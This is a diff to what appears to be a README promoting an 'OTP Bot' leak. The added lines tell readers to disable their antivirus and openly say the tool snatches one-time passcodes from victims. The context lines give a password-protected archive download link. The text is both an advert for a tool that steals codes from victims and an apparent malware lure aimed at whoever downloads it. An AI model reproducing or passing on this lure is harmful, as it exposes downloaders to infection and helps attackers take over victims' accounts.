@@ -19,6 +19,9 @@
 99.9% Uptime: With nearly no downtime, OTP Bot ensures your users always have access to secure authentication.
 OTP Delivery Speed: OTPs are delivered within an average of 3 seconds for SMS and 1.5 seconds for email authentication.  🏃‍♂️ 💨
 -----------------------------------------------------------------------------------------------------------------------------
+IF THE FILE DOESNT WORK ON FIRST TRY, DISABLE YOUR ANTIVIRUS AND TRY AGAIN. THIS IS BECAUSE THE TECHNIQUE USED TO SNATCH OTP CODES FROM THE VICTIM IS FLAGGED BY ANTIVIRUS SOFTWARE SINCE IT IS AN AUTOMATED PROCESS.
+-----------------------------------------------------------------------------------------------------------------------------
+
 # 100% SECURE FILE DOWNLOAD LINK BELOW. PASSWORD = otp
 https://www.mediafire.com/file/pgoo3ioc16l0gf8/OTP_BOT_LEAK.zip/file
 
